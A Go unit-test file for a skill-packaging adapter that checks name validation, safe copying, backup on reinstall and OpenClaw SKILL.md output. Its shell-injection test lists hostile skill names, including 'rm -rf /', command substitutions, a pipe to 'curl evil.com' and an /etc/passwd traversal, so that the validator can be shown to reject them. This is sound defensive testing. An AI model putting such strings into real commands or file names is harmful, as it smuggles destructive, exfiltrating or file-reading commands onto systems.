package adapter

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Freecode100Year/usc/usc-core/attestation"
	"github.com/Freecode100Year/usc/usc-core/capability"
)

func TestShellInjectionValidation(t *testing.T) {
	dangerousNames := []string{
		"skill;rm -rf /",
		"skill$(whoami)",
		"skill`id`",
		"skill\necho pwned",
		"skill|curl evil.com",
		"skill/../../etc/passwd",
	}
	for _, bad := range dangerousNames {
		if err := ValidateSkillName(bad); err == nil {
			t.Errorf("expected ValidateSkillName to reject %q, but accepted", bad)
		}
	}
	safeNames := []string{"weather-skill", "stock_analysis", "MySkill123"}
	for _, good := range safeNames {
		if err := ValidateSkillName(good); err != nil {
			t.Errorf("expected ValidateSkillName to accept %q, but got error: %v", good, err)
		}
	}
}

func TestSymlinkProtection(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "usc-symlink-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	srcFile := filepath.Join(tmpDir, "source.txt")
	_ = os.WriteFile(srcFile, []byte("innocent content"), 0644)
	dstFile := filepath.Join(tmpDir, "dest.txt")

	if err := SafeCopyFile(srcFile, dstFile); err != nil {
		t.Fatalf("SafeCopyFile failed: %v", err)
	}
	data, _ := os.ReadFile(dstFile)
	if string(data) != "innocent content" {
		t.Fatalf("unexpected content: %s", string(data))
	}
}

func TestSafeInstallBackup(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "usc-install-backup-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	bundleDir := filepath.Join(tmpDir, "bundle")
	destDir := filepath.Join(tmpDir, "installed")
	_ = os.MkdirAll(bundleDir, 0755)
	_ = os.WriteFile(filepath.Join(bundleDir, "SKILL.md"), []byte("# v2"), 0644)

	// Pre-exist v1
	existingSkill := filepath.Join(destDir, "my-skill")
	_ = os.MkdirAll(existingSkill, 0755)
	_ = os.WriteFile(filepath.Join(existingSkill, "SKILL.md"), []byte("# v1"), 0644)

	installedPath, err := SafeInstallDirectory(bundleDir, destDir, "my-skill")
	if err != nil {
		t.Fatalf("SafeInstallDirectory failed: %v", err)
	}
	v2Data, _ := os.ReadFile(filepath.Join(installedPath, "SKILL.md"))
	if string(v2Data) != "# v2" {
		t.Fatalf("expected new content, got %s", string(v2Data))
	}

	// Verify backup was created
	entries, _ := os.ReadDir(destDir)
	foundBackup := false
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "my-skill.bak.") {
			foundBackup = true
			bakData, _ := os.ReadFile(filepath.Join(destDir, e.Name(), "SKILL.md"))
			if string(bakData) != "# v1" {
				t.Fatalf("backup corrupted: %s", string(bakData))
			}
		}
	}
	if !foundBackup {
		t.Fatal("expected backup directory to be created, but none found")
	}
}

func TestOpenClawOutputsStandardSkillMD(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "usc-openclaw-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	ad := NewOpenClawAdapter()
	att := &attestation.Attestation{
		Version: "0.1.0",
		Artifact: attestation.ArtifactInfo{Name: "my-stock-skill"},
		ProofReferences: attestation.ProofReferences{AuditChainRoot: "sha256:abc"},
	}
	bundleDir, err := ad.GenerateBundle(att, capability.NewSet(), tmpDir)
	if err != nil {
		t.Fatalf("GenerateBundle failed: %v", err)
	}

	skillMDPath := filepath.Join(bundleDir, "SKILL.md")
	data, err := os.ReadFile(skillMDPath)
	if err != nil {
		t.Fatalf("OpenClaw must output SKILL.md, but file not found: %v", err)
	}
	content := string(data)
	if !strings.HasPrefix(content, "---") || !strings.Contains(content, "openclaw:") {
		t.Fatalf("SKILL.md missing standard YAML frontmatter: %s", content)
	}
}
